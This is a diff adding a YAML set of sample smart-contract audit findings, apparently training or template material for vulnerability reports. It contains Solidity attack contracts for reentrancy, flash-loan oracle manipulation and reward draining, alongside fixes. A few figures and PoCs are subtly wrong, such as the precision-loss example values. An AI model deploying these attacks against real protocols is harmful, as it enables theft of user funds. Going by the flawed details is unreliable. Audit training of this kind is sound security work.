@@ -1,0 +1,618 @@
+# Example Findings for Training
+# Real-world style vulnerability reports for different categories
+
+reentrancy_examples:
+  - id: "H-01"
+    severity: "High"
+    title: "Cross-function reentrancy allows draining of vault funds"
+    vulnerability_type: "reentrancy"
+    summary: |
+      The withdraw() function updates user balance after external call,
+      allowing attacker to re-enter through deposit() and manipulate state.
+
+    detail: |
+      The VaultManager contract is vulnerable to cross-function reentrancy.
+      In the withdraw() function, the contract transfers ETH to the user
+      before updating their balance:
+
+      ```solidity
+      function withdraw(uint256 amount) external {
+          require(balances[msg.sender] >= amount, "Insufficient balance");
+
+          // External call before state update
+          (bool success, ) = msg.sender.call{value: amount}("");
+          require(success, "Transfer failed");
+
+          // State update after external call - vulnerable!
+          balances[msg.sender] -= amount;
+      }
+      ```
+
+      An attacker can deploy a malicious contract that, in its receive()
+      function, calls deposit() with a small amount. This updates the
+      attacker's balance before the subtraction in withdraw() completes.
+
+    impact: |
+      An attacker can drain all ETH from the vault. With current TVL of
+      $5M, this represents a critical risk of total fund loss.
+
+    poc: |
+      ```solidity
+      contract Attacker {
+          VaultManager vault;
+          uint256 attackCount;
+
+          constructor(address _vault) {
+              vault = VaultManager(_vault);
+          }
+
+          function attack() external payable {
+              vault.deposit{value: msg.value}();
+              vault.withdraw(msg.value);
+          }
+
+          receive() external payable {
+              if (attackCount < 10) {
+                  attackCount++;
+                  vault.deposit{value: 1 wei}();
+                  vault.withdraw(address(vault).balance);
+              }
+          }
+      }
+      ```
+
+    recommendation: |
+      1. Follow checks-effects-interactions pattern:
+      ```solidity
+      function withdraw(uint256 amount) external {
+          require(balances[msg.sender] >= amount, "Insufficient balance");
+
+          // Update state BEFORE external call
+          balances[msg.sender] -= amount;
+
+          (bool success, ) = msg.sender.call{value: amount}("");
+          require(success, "Transfer failed");
+      }
+      ```
+
+      2. Add reentrancy guard:
+      ```solidity
+      modifier nonReentrant() {
+          require(!locked, "Reentrant call");
+          locked = true;
+          _;
+          locked = false;
+      }
+      ```
+
+access_control_examples:
+  - id: "H-02"
+    severity: "High"
+    title: "Missing access control on initialize() allows attacker to take ownership"
+    vulnerability_type: "access_control"
+    summary: |
+      The initialize() function lacks access control, allowing anyone to
+      call it and set themselves as the owner of the protocol.
+
+    detail: |
+      The protocol uses an upgradeable proxy pattern but the implementation
+      contract's initialize() function can be called by anyone:
+
+      ```solidity
+      contract VaultImpl is Initializable {
+          address public owner;
+
+          function initialize(address _owner) external initializer {
+              owner = _owner;  // No access control!
+          }
+
+          function withdrawFees(address to) external {
+              require(msg.sender == owner, "Not owner");
+              // Transfer all accumulated fees
+          }
+      }
+      ```
+
+      An attacker can front-run the legitimate initialization or call
+      initialize() on an uninitialized implementation contract.
+
+    impact: |
+      Attacker gains owner privileges, can withdraw all protocol fees,
+      modify critical parameters, and potentially upgrade to malicious
+      implementation.
+
+    poc: |
+      ```solidity
+      function test_uninitializedImpl() public {
+          // Deploy implementation (not through proxy)
+          VaultImpl impl = new VaultImpl();
+
+          // Anyone can initialize
+          impl.initialize(attacker);
+
+          // Attacker is now owner
+          assertEq(impl.owner(), attacker);
+      }
+      ```
+
+    recommendation: |
+      1. Disable initializers in constructor:
+      ```solidity
+      constructor() {
+          _disableInitializers();
+      }
+      ```
+
+      2. Use OpenZeppelin's Initializable properly with _init functions.
+
+oracle_manipulation_examples:
+  - id: "H-03"
+    severity: "High"
+    title: "Spot price oracle can be manipulated via flash loan"
+    vulnerability_type: "oracle_manipulation"
+    summary: |
+      The protocol uses Uniswap V2 spot price for collateral valuation,
+      which can be manipulated within a single transaction using flash loans.
+
+    detail: |
+      The LendingPool calculates collateral value using the current
+      Uniswap V2 reserve ratio:
+
+      ```solidity
+      function getCollateralValue(address token, uint256 amount) public view returns (uint256) {
+          (uint112 reserve0, uint112 reserve1, ) = IUniswapV2Pair(pair).getReserves();
+          uint256 price = uint256(reserve1) * 1e18 / uint256(reserve0);
+          return amount * price / 1e18;
+      }
+      ```
+
+      An attacker can:
+      1. Flash loan large amount of token0
+      2. Swap to manipulate reserves (inflate token1 price)
+      3. Deposit small collateral, now valued highly
+      4. Borrow against inflated collateral
+      5. Swap back, repay flash loan
+
+    impact: |
+      Attacker can borrow significantly more than their actual collateral
+      value, effectively stealing funds from the lending pool. A 10 ETH
+      flash loan can extract ~100 ETH from a pool with $10M TVL.
+
+    poc: |
+      ```solidity
+      function test_oracleManipulation() public {
+          // Get flash loan
+          uint256 flashAmount = 1000 ether;
+          flashLender.flashLoan(address(this), token0, flashAmount, "");
+      }
+
+      function onFlashLoan(address, address token, uint256 amount, bytes calldata) external {
+          // Manipulate price - swap large amount
+          token0.approve(address(router), amount);
+          router.swapExactTokensForTokens(amount, 0, path, address(this), block.timestamp);
+
+          // Collateral now worth 10x more
+          uint256 inflatedValue = lendingPool.getCollateralValue(token1, 10 ether);
+
+          // Borrow against inflated value
+          lendingPool.deposit(token1, 10 ether);
+          lendingPool.borrow(token0, inflatedValue * 80 / 100);
+
+          // Swap back and repay
+          // Keep the profit
+      }
+      ```
+
+    recommendation: |
+      1. Use TWAP oracle instead of spot price:
+      ```solidity
+      function getCollateralValue(address token, uint256 amount) public view returns (uint256) {
+          uint256 price = oracle.consult(token, 1e18, 30 minutes);  // 30 min TWAP
+          return amount * price / 1e18;
+      }
+      ```
+
+      2. Use Chainlink price feeds for critical valuations.
+      3. Add price deviation checks between spot and TWAP.
+
+flash_loan_examples:
+  - id: "H-04"
+    severity: "High"
+    title: "Flash loan attack drains reward pool through instant stake/unstake"
+    vulnerability_type: "flash_loan"
+    summary: |
+      Rewards are calculated based on current staked balance without
+      time-locking, allowing flash loan to claim disproportionate rewards.
+
+    detail: |
+      The StakingRewards contract calculates rewards per second based on
+      the user's proportion of total staked tokens:
+
+      ```solidity
+      function claimRewards() external {
+          uint256 userShare = stakedBalance[msg.sender] * 1e18 / totalStaked;
+          uint256 rewards = pendingRewards * userShare / 1e18;
+
+          rewardToken.transfer(msg.sender, rewards);
+          pendingRewards -= rewards;
+      }
+      ```
+
+      No time lock or minimum staking period is enforced.
+
+    impact: |
+      An attacker can use a flash loan to temporarily own 99% of the
+      staked tokens, claim 99% of all accumulated rewards, then unstake
+      and repay the flash loan. All pending rewards (~$500K) at risk.
+
+    poc: |
+      ```solidity
+      function attack() external {
+          // Flash loan 1M tokens
+          uint256 amount = 1_000_000 ether;
+          aave.flashLoan(address(this), token, amount, "");
+      }
+
+      function executeOperation(address, uint256 amount, uint256 premium, address) external {
+          // Stake flash loaned tokens
+          token.approve(address(staking), amount);
+          staking.stake(amount);
+
+          // Now own 99% of pool, claim 99% of rewards
+          staking.claimRewards();
+
+          // Unstake
+          staking.unstake(amount);
+
+          // Repay flash loan + premium
+          token.transfer(msg.sender, amount + premium);
+
+          // Keep the stolen rewards!
+      }
+      ```
+
+    recommendation: |
+      1. Add minimum staking duration:
+      ```solidity
+      mapping(address => uint256) public stakeTime;
+
+      function claimRewards() external {
+          require(block.timestamp >= stakeTime[msg.sender] + 7 days, "Too early");
+          // ... rest of claim logic
+      }
+      ```
+
+      2. Use time-weighted average balance for reward calculation.
+      3. Snapshot balances at reward distribution time.
+
+precision_loss_examples:
+  - id: "M-01"
+    severity: "Medium"
+    title: "Division before multiplication causes significant precision loss in fee calculation"
+    vulnerability_type: "precision_loss"
+    summary: |
+      Fee calculation divides before multiplying, causing up to 0.1% loss
+      per transaction that accumulates over time.
+
+    detail: |
+      The swap fee is calculated incorrectly:
+
+      ```solidity
+      function calculateFee(uint256 amount) public view returns (uint256) {
+          // Wrong: division before multiplication
+          return amount / 10000 * feeBps;  // feeBps = 30 (0.3%)
+      }
+      ```
+
+      For amount = 9999, this returns 0 instead of 2.
+      For amount = 19999, this returns 30 instead of 59.
+
+    impact: |
+      Protocol loses approximately 0.05% of expected fees on average.
+      With $10M daily volume, this is ~$5,000 per day in lost revenue.
+
+    recommendation: |
+      ```solidity
+      function calculateFee(uint256 amount) public view returns (uint256) {
+          return amount * feeBps / 10000;  // Multiply first
+      }
+      ```
+
+signature_replay_examples:
+  - id: "H-05"
+    severity: "High"
+    title: "Missing nonce in permit signature allows replay attacks"
+    vulnerability_type: "signature_replay"
+    summary: |
+      The permit function doesn't include a nonce, allowing the same
+      signature to be replayed multiple times to drain approvals.
+
+    detail: |
+      The custom permit implementation is missing critical replay protection:
+
+      ```solidity
+      function permit(
+          address owner,
+          address spender,
+          uint256 value,
+          uint256 deadline,
+          bytes memory signature
+      ) external {
+          require(block.timestamp <= deadline, "Expired");
+
+          bytes32 hash = keccak256(abi.encodePacked(owner, spender, value, deadline));
+          address signer = ECDSA.recover(hash, signature);
+          require(signer == owner, "Invalid signature");
+
+          _approve(owner, spender, value);  // No nonce check!
+      }
+      ```
+
+      Missing: nonce tracking, domain separator, chain ID.
+
+    impact: |
+      Attacker can replay valid signatures to:
+      1. Re-approve tokens after owner revokes
+      2. Replay across chains (missing chainId)
+      3. Front-run and replay within same block
+
+    recommendation: |
+      Use EIP-2612 compliant implementation:
+      ```solidity
+      mapping(address => uint256) public nonces;
+
+      function permit(...) external {
+          bytes32 hash = keccak256(abi.encodePacked(
+              "\x19\x01",
+              DOMAIN_SEPARATOR,
+              keccak256(abi.encode(
+                  PERMIT_TYPEHASH,
+                  owner, spender, value, nonces[owner]++, deadline
+              ))
+          ));
+          // ... verify signature
+      }
+      ```
+
+frontrunning_examples:
+  - id: "M-02"
+    severity: "Medium"
+    title: "Sandwich attack possible on large swaps due to missing slippage"
+    vulnerability_type: "frontrunning"
+    summary: |
+      The swap function has no slippage protection, allowing MEV bots
+      to sandwich transactions for profit.
+
+    detail: |
+      Users call swap with no minimum output amount:
+
+      ```solidity
+      function swap(address tokenIn, uint256 amountIn) external {
+          uint256 amountOut = getAmountOut(tokenIn, amountIn);
+          // No minAmountOut parameter!
+
+          IERC20(tokenIn).transferFrom(msg.sender, address(this), amountIn);
+          IERC20(tokenOut).transfer(msg.sender, amountOut);
+      }
+      ```
+
+      Attack sequence:
+      1. Bot sees pending swap TX in mempool
+      2. Front-runs with large buy (raises price)
+      3. Victim's TX executes at worse rate
+      4. Bot back-runs with sell (profits from spread)
+
+    impact: |
+      Users lose 1-5% on large swaps. With $1M daily volume,
+      ~$10-50K daily extracted by MEV bots.
+
+    recommendation: |
+      ```solidity
+      function swap(
+          address tokenIn,
+          uint256 amountIn,
+          uint256 minAmountOut,  // Add slippage protection
+          uint256 deadline       // Add deadline
+      ) external {
+          require(block.timestamp <= deadline, "Expired");
+          uint256 amountOut = getAmountOut(tokenIn, amountIn);
+          require(amountOut >= minAmountOut, "Slippage");
+          // ...
+      }
+      ```
+
+dos_examples:
+  - id: "M-03"
+    severity: "Medium"
+    title: "Unbounded loop in reward distribution causes DoS"
+    vulnerability_type: "denial_of_service"
+    summary: |
+      Iterating over all stakers in distributeRewards() will revert
+      when staker count exceeds gas limit.
+
+    detail: |
+      ```solidity
+      function distributeRewards() external {
+          for (uint256 i = 0; i < stakers.length; i++) {  // Unbounded!
+              uint256 reward = calculateReward(stakers[i]);
+              rewardToken.transfer(stakers[i], reward);
+          }
+      }
+      ```
+
+      With 10,000+ stakers, this exceeds block gas limit.
+
+    impact: |
+      Rewards permanently stuck. Protocol functionality broken.
+      All staker funds effectively frozen.
+
+    recommendation: |
+      Use pull-over-push pattern:
+      ```solidity
+      mapping(address => uint256) public pendingRewards;
+
+      function updateRewards() external {
+          // Update global reward index
+          rewardPerToken += newRewards / totalStaked;
+      }
+
+      function claimRewards() external {
+          uint256 reward = pendingRewards[msg.sender];
+          pendingRewards[msg.sender] = 0;
+          rewardToken.transfer(msg.sender, reward);
+      }
+      ```
+
+business_logic_examples:
+  - id: "H-06"
+    severity: "High"
+    title: "Liquidation threshold can be bypassed by splitting position"
+    vulnerability_type: "business_logic"
+    summary: |
+      Users can avoid liquidation by splitting underwater position
+      across multiple accounts, each below dust threshold.
+
+    detail: |
+      The liquidation check has a minimum size requirement:
+
+      ```solidity
+      function liquidate(address user) external {
+          require(getHealthFactor(user) < 1e18, "Healthy");
+          require(positions[user].collateral >= MIN_LIQUIDATION, "Too small");
+          // ...
+      }
+      ```
+
+      Attack:
+      1. User has $100K position at 90% LTV (unhealthy)
+      2. Splits into 1000 accounts of $100 each
+      3. Each below MIN_LIQUIDATION threshold
+      4. None can be liquidated, bad debt accumulates
+
+    impact: |
+      Protocol accumulates bad debt. Lenders lose funds when
+      underwater positions can't be liquidated.
+
+    recommendation: |
+      1. Remove minimum or set very low
+      2. Track total exposure per user across accounts
+      3. Add protocol-level liquidation backstop
+
+centralization_examples:
+  - id: "M-04"
+    severity: "Medium"
+    title: "Admin can rug users by setting fee to 100%"
+    vulnerability_type: "centralization"
+    summary: |
+      No upper bound on fee parameter allows admin to extract all user funds.
+
+    detail: |
+      ```solidity
+      function setFee(uint256 newFee) external onlyOwner {
+          fee = newFee;  // No max check!
+      }
+
+      function withdraw(uint256 amount) external {
+          uint256 feeAmount = amount * fee / 10000;
+          token.transfer(owner, feeAmount);
+          token.transfer(msg.sender, amount - feeAmount);
+      }
+      ```
+
+      Owner can set fee = 10000 (100%) and drain on next withdrawal.
+
+    impact: |
+      Complete loss of user funds if admin key compromised or malicious.
+
+    recommendation: |
+      ```solidity
+      uint256 public constant MAX_FEE = 500;  // 5% max
+
+      function setFee(uint256 newFee) external onlyOwner {
+          require(newFee <= MAX_FEE, "Fee too high");
+          fee = newFee;
+      }
+      ```
+
+      Also consider: timelock, multisig, governance for fee changes.
+
+# Fallback template for ANY vulnerability type
+generic_template:
+  structure: |
+    ## [{SEVERITY}-{ID}] {Title}
+
+    ### Summary
+    One sentence: what's broken and what's the impact.
+
+    ### Vulnerability Detail
+    1. Explain the root cause
+    2. Show the vulnerable code
+    3. Describe the attack path step-by-step
+
+    ### Impact
+    - What can an attacker achieve?
+    - Quantify: funds at risk, likelihood, conditions
+
+    ### Proof of Concept
+    ```solidity
+    // Foundry test or step-by-step reproduction
+    ```
+
+    ### Recommendation
+    Specific fix with code example.
+
+  principles:
+    - "Every finding needs: root cause, impact, PoC, fix"
+    - "If no PoC, downgrade severity or mark as informational"
+    - "Quantify impact whenever possible"
+    - "Be specific - 'add validation' is not a recommendation"
+    - "Reference exact line numbers"
+
+  adapting_to_unknown_vulns: |
+    For vulnerability types not in examples:
+    1. Identify the core security property being violated
+    2. Map to closest known category for severity guidance
+    3. Focus on: what invariant is broken, how to exploit, how to fix
+    4. Use generic template structure above
+
+writing_guidelines:
+  structure:
+    - "Lead with impact - what can go wrong"
+    - "Explain root cause clearly"
+    - "Provide working PoC"
+    - "Give specific, implementable fix"
+
+  common_mistakes:
+    - "Vague impact statements"
+    - "No PoC or untested PoC"
+    - "Recommendation that doesn't fix the issue"
+    - "Missing severity justification"
+    - "Over-claiming severity"
+
+  quality_markers:
+    - "Line-by-line code walkthrough"
+    - "Clear attack scenario"
+    - "Quantified impact ($ at risk)"
+    - "Working Foundry test"
+    - "Defense in depth recommendations"
+
+  handling_novel_vulnerabilities: |
+    When encountering a vulnerability type without a specific template:
+
+    1. **Classify the security impact:**
+       - Fund loss → treat like reentrancy/flash loan examples
+       - Access bypass → treat like access control examples
+       - Data manipulation → treat like oracle examples
+       - Availability → treat like DoS examples
+
+    2. **Apply universal structure:**
+       - What's the root cause?
+       - What's the attack vector?
+       - What's at risk?
+       - How do you fix it?
+
+    3. **Severity mapping:**
+       - Direct fund loss = High/Critical
+       - Conditional fund loss = Medium/High
+       - Griefing/DoS = Medium
+       - Best practices = Low/Info
